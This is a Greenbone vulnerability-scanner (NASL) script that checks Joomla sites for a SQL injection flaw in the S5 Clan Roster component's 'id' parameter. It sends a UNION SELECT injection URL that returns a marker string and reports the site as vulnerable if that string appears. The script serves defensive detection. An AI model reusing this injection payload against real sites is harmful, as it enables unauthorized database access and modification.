# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:joomla:joomla";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103713");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:N");

  script_name("Joomla S5 Clan Roster com_s5clanroster 'id' Parameter SQL Injection Vulnerability");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/25410/");
  script_xref(name:"URL", value:"http://www.shape5.com/product_details/club_extensions/s5_clan_roster.html");

  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-05-17 11:02:29 +0200 (Fri, 17 May 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"solution", value:"Vendor updates are available.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"The S5 Clan Roster component for Joomla is prone to an SQL-injection
vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit
latent vulnerabilities in the underlying database.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/index.php?option=com_s5clanroster&view=s5clanroster&layout=category&task=category&id=77777777777'%20union+select+1,0x53514c2d496e6a656374696f6e2d54657374'%20--";

if(http_vuln_check(port:port, url:url,pattern:"SQL-Injection-Test")) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
